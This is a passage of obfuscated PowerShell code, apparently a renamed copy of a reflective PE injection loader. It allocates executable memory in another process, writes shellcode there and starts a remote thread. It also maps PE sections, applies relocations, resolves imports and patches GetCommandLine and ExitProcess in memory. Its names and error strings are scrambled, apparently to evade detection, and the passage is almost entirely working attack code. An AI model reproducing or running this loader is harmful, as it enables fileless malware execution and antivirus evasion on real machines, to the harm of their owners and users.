            $GefindessSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $sdkjg3eSD2 = @(0x48, 0xba)
            $SDJHKF3 = @(0x48, 0xb8)
            $JSGUessSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $HIDUC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GefindessSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $sdkjg3eSD2 = @(0xb9)
            $SDJHKF3 = @(0x51, 0x50, 0xb8)
            $JSGUessSC4 = @(0xff, 0xd0, 0xb9)
            $HIDUC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GefindessSC1.Length + $sdkjg3eSD2.Length + $SDJHKF3.Length + $JSGUessSC4.Length + $HIDUC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GefindessSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GefindessSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $sdkjg3eSD2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($sdkjg3eSD2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $SDJHKF3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($SDJHKF3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $JSGUessSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($JSGUessSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($bannaaGet, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $HIDUC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($HIDUC5.Length)
        
        $RSCAddr = $l64ftion.VirtualAllocEx.Invoke($applejuce, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $WiSDGKDants.MEM_COMMIT -bor $WiSDGKDants.MEM_RESERVE, $WiSDGKDants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "KSHDD"
        }
        
        $Success = $l64ftion.WriteProcessMemory.Invoke($applejuce, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "SLKDHLKD"
        }
        
        $RThreadHandle = sadkjhdsjD -ProcessHandle $applejuce -workhards $RSCAddr -l64ftion $l64ftion #-
        $Result = $l64ftion.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "sd22."
        }
        

        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $l64ftion.ReadProcessMemory.Invoke($applejuce, $bannaaGet, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        $l64ftion.VirtualFreeEx.Invoke($applejuce, $RSCAddr, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
        $l64ftion.VirtualFreeEx.Invoke($applejuce, $RFuncNamePtr, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
        $l64ftion.VirtualFreeEx.Invoke($applejuce, $bannaaGet, [UIntPtr][UInt64]0, $WiSDGKDants.MEM_RELEASE) | Out-Null
        
        return $ProcAddress
    }


    Function Cthis-SectioDSns
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PPSDHKDSDBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $DJH32H
        )
        
        for( $i = 0; $i -lt $LSIINFO.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$DJH32H.IMAGE_SECTION_HEADER)
        

            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$SectionHeader.VirtualAddress))
            




            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Cthis-SectioDSns::MarshalCopy" -LSIINFO $LSIINFO -workhards $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PPSDHKDSDBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        

            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$workhards = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Cthis-SectioDSns::Memset" -LSIINFO $LSIINFO -workhards $workhards -Size $Difference | Out-Null
                $l64ftion.memset.Invoke($workhards, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function LSHDjh3-upd
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $DJH32H
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_BASE_RELOCATION)
        

        if (($OriginalImageBase -eq [Int64]$LSIINFO.EffectiveLKSHKDANDL) `
                -or ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($LSIINFO.EffectiveLKSHKDANDL)) -eq $true)
        {
            $BaseDifference = bud-ksgLHDnwn ($OriginalImageBase) ($LSIINFO.EffectiveLKSHKDANDL)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($LSIINFO.EffectiveLKSHKDANDL) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = bud-ksgLHDnwn ($LSIINFO.EffectiveLKSHKDANDL) ($OriginalImageBase)
        }
        

        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {

            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$DJH32H.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2


            for($i = 0; $i -lt $NumRelocations; $i++)
            {

                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])


                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }




                if (($RelocType -eq $WiSDGKDants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $WiSDGKDants.IMAGE_REL_BASED_DIR64))
                {           

                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](bud-ksgLHDnwn ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $WiSDGKDants.IMAGE_REL_BASED_ABSOLUTE)
                {

                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function lhsdu-jsd
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $DJH32H,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $applejuce
        )
        
        $RemoteLoading = $false
        if ($LSIINFO.LKSHKDANDL -ne $LSIINFO.EffectiveLKSHKDANDL)
        {
            $RemoteLoading = $true
        }
        
        if ($LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$LSIINFO.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$DJH32H.IMAGE_IMPORT_DESCRIPTOR)
                

                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $UMSKHDDLE = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$LSIINFO.LKSHKDANDL) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $UMSKHDDLE = HDSK-OUHF -applejuce $applejuce -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $UMSKHDDLE = $l64ftion.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($UMSKHDDLE -eq $null) -or ($UMSKHDDLE -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                

                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $ProcedureName = ''



                    [IntPtr]$NewThunkRef= [IntPtr]::Zero
                    if([Int64]$OriginalThunkRefVal -lt 0)
                    {
                        $ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef= KJSHDeUFHEF7 -applejuce $applejuce -RemoteDllHandle $UMSKHDDLE -FunctionName $ProcedureName
                    }
                    else
                    {
                        if($ProcedureName -is [string])
                        {
                            [IntPtr]$NewThunkRef= $l64ftion.GetProcAddress.Invoke($UMSKHDDLE, $ProcedureName)
                        }
                        else
                        {
                            [IntPtr]$NewThunkRef= $l64ftion.GetProcAddressOrdinal.Invoke($UMSKHDDLE, $ProcedureName)
                        }
                    }
                    
                    if ($NewThunkRef-eq $null -or $NewThunkRef-eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function SDhk34JSD
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $WiSDGKDants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $WiSDGKDants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $WiSDGKDants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function usdKdhdf
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $DJH32H
        )
        
        for( $i = 0; $i -lt $LSIINFO.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$LSIINFO.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DJH32H.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$DJH32H.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($LSIINFO.LKSHKDANDL) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = SDhk34JSD $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "usdKdhdf::VirtualProtect" -LSIINFO $LSIINFO -workhards $SectionPtr -Size $SectionSize | Out-Null
            $Success = $l64ftion.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    


    Function KSHDUWKHF
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $LSIINFO,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $l64ftion,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $WiSDGKDants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        

        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Hand32Ker = $l64ftion.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Hand32Ker -eq [IntPtr]::Zero)
        {
            throw "Kell"
        }
        
        [IntPtr]$KernelBaseHandle = $l64ftion.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "Kernl"
        }




        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $l64ftion.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $l64ftion.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }


        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        

        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $l64ftion.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $l64ftion.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)


        [UInt32]$OldProtectFlag = 0
        $Success = $l64ftion.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($WiSDGKDants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Cailed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $l64ftion.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        

        [UInt32]$OldProtectFlag = 0
        $Success = $l64ftion.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($WiSDGKDants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Caed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $l64ftion.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null

        
        





        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $l64ftion.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $l64ftion.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $l64ftion.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                

                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $l64ftion.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($WiSDGKDants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $l64ftion.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $l64ftion.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($WiSDGKDants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $l64ftion.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }

        
        



        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        

        [IntPtr]$MscoreeHandle = $l64ftion.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $l64ftion.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        

        [IntPtr]$ExitProcessAddr = $l64ftion.GetProcAddress.Invoke($Hand32Ker, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $KSDGKJSDHTMP = $ProcExitFunctionAddr


            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)

            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $l64ftion.GetProcAddress.Invoke($Hand32Ker, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $l64ftion.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$WiSDGKDants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            

            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $l64ftion.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
